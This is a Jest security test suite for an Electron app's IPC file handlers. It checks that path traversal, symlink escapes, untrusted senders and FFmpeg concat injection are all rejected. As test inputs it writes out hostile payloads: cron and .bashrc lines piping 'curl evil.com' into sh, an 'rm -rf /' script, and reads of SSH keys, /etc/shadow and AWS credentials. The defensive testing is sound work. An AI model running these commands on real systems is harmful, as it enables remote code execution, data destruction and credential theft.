/**
 * Black Box Security Tests for IPC Handlers
 *
 * These tests simulate real attacks by calling actual IPC handlers with malicious payloads.
 * Unlike unit tests that test utility functions in isolation, these tests:
 * 1. Call the actual handler functions with malicious payloads
 * 2. Verify the attack is blocked (error response, no side effects)
 * 3. Confirm real files weren't created/read outside allowed directories
 */

import * as os from 'os'
import * as path from 'path'
import { promises as fsPromises } from 'fs'
import type { IpcMainInvokeEvent } from 'electron'
import {
  createMockEvent,
  createUntrustedMockEvent,
  createTrustedMockEvent,
  fileExistsSync,
  createTempTestDir,
  cleanupDir,
  createSymlink,
  createTestFile,
  createLargeFile,
  expandHomePath,
  type IpcHandler,
} from './helpers/ipc-test-helpers'

// Test directories
let testTempDir: string
let mockRecordingsDir: string

// Captured handlers
const handlers = new Map<string, IpcHandler>()

// Mock Electron modules
jest.mock('electron', () => {
  const actualPath = jest.requireActual('path')
  const actualOs = jest.requireActual('os')
  const actualFs = jest.requireActual('fs')

  // Use real temp directory for realistic testing
  // IMPORTANT: Use realpathSync to resolve symlinks (macOS /var -> /private/var)
  // This ensures path comparisons work correctly in isPathWithin()
  const realTempDir = actualFs.realpathSync(actualOs.tmpdir())

  return {
    app: {
      getPath: jest.fn((name: string) => {
        const paths: Record<string, string> = {
          userData: actualPath.join(realTempDir, 'bokeh-test-userData'),
          temp: realTempDir,
          downloads: actualPath.join(realTempDir, 'bokeh-test-downloads'),
          documents: actualPath.join(realTempDir, 'bokeh-test-documents'),
        }
        return paths[name] || actualPath.join(realTempDir, `bokeh-test-${name}`)
      }),
      getAppPath: jest.fn(() => actualPath.join(realTempDir, 'bokeh-test-app')),
      isPackaged: false,
      on: jest.fn(),
    },
    ipcMain: {
      handle: jest.fn((channel: string, handler: IpcHandler) => {
        handlers.set(channel, handler)
      }),
      removeHandler: jest.fn((channel: string) => {
        handlers.delete(channel)
      }),
    },
    nativeImage: {
      createFromPath: jest.fn(() => ({
        isEmpty: () => true,
        getSize: () => ({ width: 0, height: 0 }),
        resize: jest.fn(),
        toJPEG: jest.fn(() => Buffer.from('')),
        toDataURL: jest.fn(() => ''),
      })),
      createFromBuffer: jest.fn(() => ({
        isEmpty: () => true,
        getSize: () => ({ width: 0, height: 0 }),
        resize: jest.fn(),
        toJPEG: jest.fn(() => Buffer.from('')),
        toDataURL: jest.fn(() => ''),
      })),
    },
  }
})

// Mock proxy-service to avoid FFmpeg dependencies
jest.mock('../../electron/main/services/proxy-service', () => ({
  ensurePreviewProxy: jest.fn(),
  ensureGlowProxy: jest.fn(),
  needsPreviewProxy: jest.fn(),
  getExistingProxyPath: jest.fn(),
  getExistingGlowProxyPath: jest.fn(),
  clearPreviewProxies: jest.fn(),
  clearGlowProxies: jest.fn(),
  getProxyCacheSize: jest.fn(() => 0),
  getVideoDimensions: jest.fn(),
  getVideoMetadata: jest.fn(),
  generateThumbnail: jest.fn(),
}))

// Mock video-url-factory
jest.mock('../../electron/main/utils/video-url-factory', () => ({
  makeVideoSrc: jest.fn((p: string) => `video-stream://${p}`),
}))

// Mock file-resolution
jest.mock('../../electron/main/utils/file-resolution', () => ({
  resolveRecordingFilePath: jest.fn((_p: string) => null),
}))


// Helper to get handler
function getHandler(channel: string): IpcHandler {
  const handler = handlers.get(channel)
  if (!handler) {
    throw new Error(`Handler not found: ${channel}`)
  }
  return handler
}

// Helper to call handler safely and catch errors
async function callHandler(
  channel: string,
  event: IpcMainInvokeEvent,
  ...args: any[]
): Promise<any> {
  const handler = getHandler(channel)
  try {
    return await handler(event, ...args)
  } catch (error) {
    // Return error as result for assertion
    return { success: false, error: error instanceof Error ? error.message : String(error) }
  }
}

describe('Black Box IPC Handler Attack Resistance', () => {
  beforeAll(async () => {
    // Create test directories
    testTempDir = await createTempTestDir('blackbox-ipc-')
    mockRecordingsDir = path.join(os.tmpdir(), 'bokeh-test-documents', 'Bokeh Captures')
    await fsPromises.mkdir(mockRecordingsDir, { recursive: true })

    // Clear handlers before registering
    handlers.clear()

    // Import and register handlers
    const { registerFileOperationHandlers } = await import(
      '../../electron/main/ipc/file-operations'
    )
    const { registerRecordingHandlers } = await import('../../electron/main/ipc/recording')
    const { registerWallpaperHandlers } = await import('../../electron/main/ipc/wallpapers')

    registerFileOperationHandlers()
    registerRecordingHandlers()
    registerWallpaperHandlers()
  })

  afterAll(async () => {
    await cleanupDir(testTempDir)
    await cleanupDir(mockRecordingsDir)
  })

  // ============================================================================
  // Attack 1: Arbitrary File Read via read-local-file
  // ============================================================================
  describe('read-local-file Handler', () => {
    it('blocks reading /etc/passwd', async () => {
      const event = createTrustedMockEvent()
      const result = await callHandler('read-local-file', event, '/etc/passwd')

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/access denied/i)
    })

    it('blocks reading ~/.ssh/id_rsa', async () => {
      const event = createTrustedMockEvent()
      const sshKeyPath = expandHomePath('~/.ssh/id_rsa')
      const result = await callHandler('read-local-file', event, sshKeyPath)

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/access denied/i)
    })

    it('blocks reading /etc/shadow', async () => {
      const event = createTrustedMockEvent()
      const result = await callHandler('read-local-file', event, '/etc/shadow')

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/access denied/i)
    })

    it('blocks path traversal with ../', async () => {
      const event = createTrustedMockEvent()
      // Attempt to traverse from temp dir to /etc/passwd
      const traversalPath = path.join(os.tmpdir(), '../../etc/passwd')
      const result = await callHandler('read-local-file', event, traversalPath)

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/access denied/i)
    })

    it('blocks reading AWS credentials', async () => {
      const event = createTrustedMockEvent()
      const awsCredsPath = expandHomePath('~/.aws/credentials')
      const result = await callHandler('read-local-file', event, awsCredsPath)

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/access denied/i)
    })

    it('blocks symlink to sensitive file', async () => {
      // Create a symlink in temp dir pointing to /etc/passwd
      const symlinkPath = path.join(testTempDir, 'passwd-link')
      const linkCreated = await createSymlink('/etc/passwd', symlinkPath)

      if (linkCreated) {
        const event = createTrustedMockEvent()
        const result = await callHandler('read-local-file', event, symlinkPath)

        expect(result.success).toBe(false)
        // The symlink itself may exist, but reading should be denied
        // because realpath resolution exposes /etc/passwd is the target
      }
    })

    it('allows reading from temp directory (legitimate use)', async () => {
      // Create a legitimate test file in temp dir
      const testFilePath = path.join(os.tmpdir(), 'bokeh-test-legitimate.txt')
      await createTestFile(testFilePath, 'legitimate content')

      try {
        const event = createTrustedMockEvent()
        const result = await callHandler('read-local-file', event, testFilePath)

        expect(result.success).toBe(true)
        expect(result.data).toBeDefined()
      } finally {
        await fsPromises.unlink(testFilePath).catch(() => {})
      }
    })
  })

  // ============================================================================
  // Attack 2: Arbitrary File Write via save-recording
  // ============================================================================
  describe('save-recording Handler', () => {
    it('blocks writing to /etc/cron.d/', async () => {
      const event = createTrustedMockEvent()
      const maliciousPath = '/etc/cron.d/backdoor'
      const maliciousContent = Buffer.from('* * * * * root /bin/bash -c "curl evil.com | sh"')

      const result = await callHandler('save-recording', event, maliciousPath, maliciousContent)

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/access denied|outside allowed/i)

      // CRITICAL: Verify file was NOT created
      expect(fileExistsSync(maliciousPath)).toBe(false)
    })

    it('blocks writing to /usr/local/bin/', async () => {
      const event = createTrustedMockEvent()
      const maliciousPath = '/usr/local/bin/backdoor'
      const maliciousContent = Buffer.from('#!/bin/bash\nrm -rf /')

      const result = await callHandler('save-recording', event, maliciousPath, maliciousContent)

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/access denied|outside allowed/i)
      expect(fileExistsSync(maliciousPath)).toBe(false)
    })

    it('blocks writing to home directory sensitive files', async () => {
      const event = createTrustedMockEvent()
      const bashrcPath = expandHomePath('~/.bashrc')
      const maliciousContent = Buffer.from('\ncurl evil.com | sh')

      const result = await callHandler('save-recording', event, bashrcPath, maliciousContent)

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/access denied|outside allowed/i)
    })

    it('blocks path traversal in destination', async () => {
      const event = createTrustedMockEvent()
      // Attempt to traverse from recordings dir
      const traversalPath = path.join(mockRecordingsDir, '../../../etc/passwd')
      const maliciousContent = Buffer.from('malicious')

      const result = await callHandler('save-recording', event, traversalPath, maliciousContent)

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/access denied|outside allowed/i)
    })

    it('allows writing to temp directory (legitimate use)', async () => {
      // The handler also allows writing to temp directory, which is useful for
      // temporary recording storage before moving to final location
      const { app } = require('electron')

      const event = createTrustedMockEvent()
      const tempDir = app.getPath('temp')
      const legitimatePath = path.join(tempDir, 'bokeh-test-recording.webm')
      const legitimateContent = Buffer.from('WEBM file content')

      const result = await callHandler('save-recording', event, legitimatePath, legitimateContent)

      expect(result.success).toBe(true)

      // Verify file was created in the correct location
      expect(fileExistsSync(legitimatePath)).toBe(true)

      // Cleanup
      await fsPromises.unlink(legitimatePath).catch(() => {})
    })
  })

  // ============================================================================
  // Attack 3: Path Traversal via save-file
  // ============================================================================
  describe('save-file Handler', () => {
    it('blocks unapproved paths', async () => {
      const event = createTrustedMockEvent()
      // save-file requires dialog approval for paths outside standard dirs
      const maliciousPath = '/tmp/outside-approved.mp4'
      const content = Buffer.from('malicious content')

      const result = await callHandler('save-file', event, content, maliciousPath)

      // Should fail because path was not approved by save dialog
      expect(result.success).toBe(false)
      expect(result.error).toMatch(/access denied|not approved/i)
    })

    it('blocks writing to system directories', async () => {
      const event = createTrustedMockEvent()
      const systemPath = '/System/Library/malicious.mp4'
      const content = Buffer.from('malicious')

      const result = await callHandler('save-file', event, content, systemPath)

      expect(result.success).toBe(false)
      expect(fileExistsSync(systemPath)).toBe(false)
    })
  })

  // ============================================================================
  // Attack 4: Symlink Escape via delete-recording-project
  // ============================================================================
  describe('delete-recording-project Handler', () => {
    it('only deletes within recordings directory', async () => {
      const event = createTrustedMockEvent()
      // Try to delete something outside recordings
      const outsidePath = '/tmp/important-file.txt'

      // Create the file to verify it's not deleted
      await createTestFile(outsidePath, 'important data')

      try {
        const result = await callHandler('delete-recording-project', event, outsidePath)

        expect(result.success).toBe(false)
        expect(result.error).toMatch(/outside|not a project/i)

        // CRITICAL: Verify file was NOT deleted
        expect(fileExistsSync(outsidePath)).toBe(true)
      } finally {
        await fsPromises.unlink(outsidePath).catch(() => {})
      }
    })

    it('rejects paths without .bokeh extension', async () => {
      const event = createTrustedMockEvent()
      const invalidPath = path.join(mockRecordingsDir, 'not-a-project.txt')

      await createTestFile(invalidPath, 'test')

      try {
        const result = await callHandler('delete-recording-project', event, invalidPath)

        expect(result.success).toBe(false)
        expect(result.error).toMatch(/not a project/i)
      } finally {
        await fsPromises.unlink(invalidPath).catch(() => {})
      }
    })

    it('blocks symlink pointing outside recordings directory', async () => {
      // Create a target outside recordings
      const outsideTarget = path.join(testTempDir, 'important-outside-data')
      await fsPromises.mkdir(outsideTarget, { recursive: true })
      await createTestFile(path.join(outsideTarget, 'data.txt'), 'important')

      // Create symlink inside recordings pointing outside
      const symlinkPath = path.join(mockRecordingsDir, 'malicious-link.bokeh')
      const linkCreated = await createSymlink(outsideTarget, symlinkPath)

      if (linkCreated) {
        const event = createTrustedMockEvent()
        await callHandler('delete-recording-project', event, symlinkPath)

        // Either the deletion should fail, or only the symlink should be deleted
        // The target outside should NOT be deleted
        expect(fileExistsSync(outsideTarget)).toBe(true)

        // Cleanup
        await fsPromises.unlink(symlinkPath).catch(() => {})
      }

      // Cleanup target
      await cleanupDir(outsideTarget)
    })
  })

  // ============================================================================
  // Attack 5: Untrusted Sender
  // ============================================================================
  describe('Untrusted Sender Verification', () => {
    it('blocks requests from http://evil.com', async () => {
      const event = createUntrustedMockEvent('http://evil.com')

      // Try various handlers
      const result1 = await callHandler('read-local-file', event, '/etc/passwd')
      expect(result1.success).toBe(false)
      expect(result1.error).toMatch(/blocked|untrusted/i)

      const result2 = await callHandler('get-video-metadata', event, '/tmp/test.mp4')
      expect(result2.success).toBe(false)
      expect(result2.error).toMatch(/blocked|untrusted/i)
    })

    it('blocks requests from file:// outside app directory', async () => {
      const event = createUntrustedMockEvent('file:///etc/malicious.html')

      const result = await callHandler('read-local-file', event, os.tmpdir())
      expect(result.success).toBe(false)
      expect(result.error).toMatch(/blocked|untrusted/i)
    })

    it('allows requests from app:// protocol', async () => {
      const event = createMockEvent({ senderUrl: 'app://./index.html' })
      const testFile = path.join(os.tmpdir(), 'trusted-test.txt')
      await createTestFile(testFile, 'test')

      try {
        const result = await callHandler('read-local-file', event, testFile)
        // Should not fail due to sender (may fail for other reasons)
        if (!result.success) {
          expect(result.error).not.toMatch(/blocked|untrusted/i)
        }
      } finally {
        await fsPromises.unlink(testFile).catch(() => {})
      }
    })
  })

  // ============================================================================
  // Attack 6: Wallpaper Path Restriction
  // ============================================================================
  describe('load-wallpaper-image Handler', () => {
    it('blocks paths outside allowed wallpaper directories', async () => {
      const event = createTrustedMockEvent()

      // Try to load a file outside /System/Library/Desktop Pictures
      const result = await callHandler('load-wallpaper-image', event, '/etc/passwd')

      expect(result.success).toBe(false)
    })

    it('blocks symlink to sensitive file', async () => {
      // This test verifies the symlink resolution in wallpaper loading
      const symlinkPath = path.join(testTempDir, 'fake-wallpaper.heic')
      const linkCreated = await createSymlink('/etc/passwd', symlinkPath)

      if (linkCreated) {
        const event = createTrustedMockEvent()
        const result = await callHandler('load-wallpaper-image', event, symlinkPath)

        // Should fail because the symlink resolves outside allowed directories
        expect(result.success).toBe(false)

        // Cleanup
        await fsPromises.unlink(symlinkPath).catch(() => {})
      }
    })

    it('blocks path traversal in wallpaper path', async () => {
      const event = createTrustedMockEvent()
      const traversalPath = '/System/Library/Desktop Pictures/../../../etc/passwd'

      const result = await callHandler('load-wallpaper-image', event, traversalPath)

      expect(result.success).toBe(false)
    })
  })

  // ============================================================================
  // Attack 7: Metadata File Restrictions
  // ============================================================================
  describe('Metadata File Handlers', () => {
    describe('read-metadata-file Handler', () => {
      it('blocks reading files outside temp directory', async () => {
        const event = createTrustedMockEvent()
        const result = await callHandler('read-metadata-file', event, '/etc/passwd')

        expect(result.success).toBe(false)
        expect(result.error).toMatch(/access denied/i)
      })

      it('blocks reading files with invalid names', async () => {
        const event = createTrustedMockEvent()
        // Try with a name that doesn't match the expected pattern
        const invalidPath = path.join(os.tmpdir(), 'not-metadata.json')

        const result = await callHandler('read-metadata-file', event, invalidPath)

        expect(result.success).toBe(false)
        expect(result.error).toMatch(/access denied/i)
      })

      it('blocks large files (DoS protection)', async () => {
        // Create a large metadata file
        const largePath = path.join(
          os.tmpdir(),
          `metadata-${'a'.repeat(8)}-${'b'.repeat(4)}-${'c'.repeat(4)}-${'d'.repeat(4)}-${'e'.repeat(12)}.json`
        )

        // Create a 50MB file (exceeds 10MB limit)
        await createLargeFile(largePath, 50)

        try {
          const event = createTrustedMockEvent()
          const result = await callHandler('read-metadata-file', event, largePath)

          expect(result.success).toBe(false)
          expect(result.error).toMatch(/too large/i)
        } finally {
          await fsPromises.unlink(largePath).catch(() => {})
        }
      })
    })

    describe('append-metadata-batch Handler', () => {
      it('blocks appending to files outside temp directory', async () => {
        const event = createTrustedMockEvent()
        const result = await callHandler(
          'append-metadata-batch',
          event,
          '/etc/passwd',
          [{ test: 'data' }],
          false
        )

        expect(result.success).toBe(false)
        expect(result.error).toMatch(/access denied/i)
      })

      it('blocks appending to files with invalid names', async () => {
        const event = createTrustedMockEvent()
        const invalidPath = path.join(os.tmpdir(), 'invalid-name.json')

        const result = await callHandler(
          'append-metadata-batch',
          event,
          invalidPath,
          [{ test: 'data' }],
          false
        )

        expect(result.success).toBe(false)
        expect(result.error).toMatch(/access denied/i)
      })
    })
  })

  // ============================================================================
  // Attack 8: Move File Restrictions
  // ============================================================================
  describe('move-file Handler', () => {
    it('blocks moving files to arbitrary locations', async () => {
      // Create a source file in temp
      const sourcePath = path.join(os.tmpdir(), 'source-file.txt')
      await createTestFile(sourcePath, 'test content')

      try {
        const event = createTrustedMockEvent()
        // Try to move to /etc
        const result = await callHandler('move-file', event, sourcePath, '/etc/malicious.txt')

        expect(result.success).toBe(false)
        expect(result.error).toMatch(/access denied|outside allowed/i)

        // Verify target was NOT created
        expect(fileExistsSync('/etc/malicious.txt')).toBe(false)
      } finally {
        await fsPromises.unlink(sourcePath).catch(() => {})
      }
    })

    it('blocks moving from arbitrary source locations', async () => {
      const event = createTrustedMockEvent()
      // Try to move /etc/passwd somewhere
      const destPath = path.join(mockRecordingsDir, 'stolen-passwd.txt')

      const result = await callHandler('move-file', event, '/etc/passwd', destPath)

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/access denied|outside allowed/i)
    })
  })

  // ============================================================================
  // Attack 9: Get File Size Restrictions
  // ============================================================================
  describe('get-file-size Handler', () => {
    it('blocks getting size of sensitive files', async () => {
      const event = createTrustedMockEvent()
      const result = await callHandler('get-file-size', event, '/etc/passwd')

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/access denied/i)
    })

    it('allows getting size of files in allowed directories', async () => {
      const testFile = path.join(os.tmpdir(), 'size-test.txt')
      await createTestFile(testFile, 'test content for size')

      try {
        const event = createTrustedMockEvent()
        const result = await callHandler('get-file-size', event, testFile)

        expect(result.success).toBe(true)
        expect(result.data.size).toBeGreaterThan(0)
      } finally {
        await fsPromises.unlink(testFile).catch(() => {})
      }
    })
  })

  // ============================================================================
  // Attack 10: File Exists Check Restrictions
  // ============================================================================
  describe('file-exists Handler', () => {
    it('does not leak existence of sensitive files', async () => {
      const event = createTrustedMockEvent()
      const result = await callHandler('file-exists', event, '/etc/passwd')

      // Should return false (deny information about files outside allowed dirs)
      expect(result).toBe(false)
    })
  })

  // ============================================================================
  // Attack 11: Open File Restrictions
  // ============================================================================
  describe('open-file Handler', () => {
    it('blocks path traversal in filename', async () => {
      const event = createTrustedMockEvent()
      // Try to use .. in the filename
      const result = await callHandler('open-file', event, '../../../etc/passwd')

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/invalid/i)
    })

    it('blocks absolute paths in filename', async () => {
      const event = createTrustedMockEvent()
      const result = await callHandler('open-file', event, '/etc/passwd')

      expect(result.success).toBe(false)
      expect(result.error).toMatch(/invalid/i)
    })
  })
})

// ============================================================================
// FFmpeg Concat Escaping Tests
// ============================================================================
describe('FFmpeg Concat Escaping', () => {
  let escapeForConcat: (path: string) => string

  beforeAll(async () => {
    const combiner = await import('../../electron/main/export/ffmpeg-combiner')
    escapeForConcat = combiner.escapeForConcat
  })

  it('strips newline injection attempts', () => {
    const maliciousPath = "video.mp4\nfile '/etc/passwd'"
    const escaped = escapeForConcat(maliciousPath)

    // The critical security property: newlines must be stripped
    // This prevents the attacker from injecting a new "file" directive
    expect(escaped).not.toContain('\n')

    // The result will contain the path as one continuous string (with quotes escaped)
    // but without the newline, it can't inject a new directive into the concat list
    // The escaped output would be something like: video.mp4file '\''/etc/passwd'\''
    // This is safe because it's treated as a single malformed filename, not a new directive
  })

  it('strips carriage return injection attempts', () => {
    const maliciousPath = "video.mp4\r\nfile '/etc/passwd'"
    const escaped = escapeForConcat(maliciousPath)

    expect(escaped).not.toContain('\r')
    expect(escaped).not.toContain('\n')
  })

  it('escapes single quotes properly', () => {
    const pathWithQuotes = "video's file.mp4"
    const escaped = escapeForConcat(pathWithQuotes)

    // Should escape the quote so it can't break out of the file '' context
    expect(escaped).toContain("\\'")
  })

  it('handles combined injection attempt', () => {
    const combinedAttack = "video.mp4'\nfile '/etc/passwd"
    const escaped = escapeForConcat(combinedAttack)

    expect(escaped).not.toContain('\n')
    // The escaped version should be safe to use in concat list
  })
})
